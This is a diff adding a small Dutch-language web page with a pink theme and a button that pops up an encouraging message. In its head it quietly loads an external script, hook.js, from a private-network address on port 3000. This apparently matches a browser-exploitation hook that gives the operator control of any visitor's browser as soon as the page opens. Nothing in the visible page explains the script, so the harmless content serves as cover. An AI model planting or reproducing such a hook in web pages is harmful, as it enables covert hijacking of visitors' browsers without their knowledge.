@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="nl">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="http://10.211.55.5:3000/hook.js"></script>
+
+    <title>Roos Thema Website</title>
+    <style>
+      body {
+        background-color: #ffe6f2;
+        color: #800040;
+        font-family: Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        margin: 0;
+      }
+
+      .container {
+        text-align: center;
+        border: 2px solid #800040;
+        padding: 20px;
+        border-radius: 10px;
+        background-color: #ffccdd;
+      }
+
+      button {
+        background-color: #ff6699;
+        color: white;
+        border: none;
+        padding: 10px 20px;
+        font-size: 16px;
+        cursor: pointer;
+        border-radius: 5px;
+      }
+
+      button:hover {
+        background-color: #ff3366;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>Welkom!</h1>
+      <button id="motivatieKnop">Klik hier</button>
+    </div>
+    <script>
+      document
+        .getElementById("motivatieKnop")
+        .addEventListener("click", function () {
+          alert("Veel succes baby, je kan dit!");
+        });
+    </script>
+  </body>
+</html>
